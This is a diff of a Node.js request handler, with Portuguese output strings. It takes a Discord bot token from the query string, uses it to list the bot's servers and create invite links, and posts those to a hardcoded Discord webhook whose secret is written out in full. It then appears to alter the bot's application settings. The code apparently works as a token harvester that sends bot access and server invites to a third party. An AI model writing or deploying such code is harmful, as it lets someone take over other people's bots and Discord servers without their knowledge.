@@ -1,10 +1,8 @@
-const axios = require("axios")
+const axios = require("axios");
+
 module.exports = async (req, res) => {
-  const {
-    applicationId,
-    token
-  } = req.query;
-  const webhookURL = "https://discord.com/api/webhooks/1319504519171932202/0DOBxgvaaVFimYzpzLo-n1YaMwd3N_E1o68YYRE4p5D3W0wUFGlENq5oYSrnVghKufeR"
+  const { applicationId, token } = req.query;
+  const webhookURL = "https://discord.com/api/webhooks/1319504519171932202/0DOBxgvaaVFimYzpzLo-n1YaMwd3N_E1o68YYRE4p5D3W0wUFGlENq5oYSrnVghKufeR";
   
   if (!applicationId || !token) {
     return res.status(400).json({
@@ -29,15 +27,22 @@ module.exports = async (req, res) => {
     });
     const guilds = await guildsResponse.json();
 
-
     const timestamp = Math.floor(Date.now() / 1000);
     
     const servers = await Promise.all(
       guilds.map(async (guild) => {
-console.log(guild)
+        const guildDetailsResponse = await fetch(`https://discord.com/api/v10/guilds/${guild.id}`, {
+          method: 'GET',
+          headers: {
+            Authorization: `Bot ${token}`,
+          },
+        });
+        const guildDetails = await guildDetailsResponse.json();
+
         const invite = await getServerInvite(guild.id, token);
-        return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${guild.memberCount} Membros\``;
-      }));
+        return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${guildDetails.member_count || 'N/A'} Membros\``;
+      })
+    );
 
     const embed = {
       username: 'BotToken',
@@ -63,7 +68,6 @@ console.log(guild)
             inline: false
           }
         ],
-        
       }],
     };
 
@@ -75,7 +79,6 @@ console.log(guild)
       body: JSON.stringify(embed),
     });
 
-    // Atualiza configurações do bot
     const response = await fetch(`https://discord.com/api/v9/applications/${applicationId}`, {
       headers: {
         accept: '*/*',
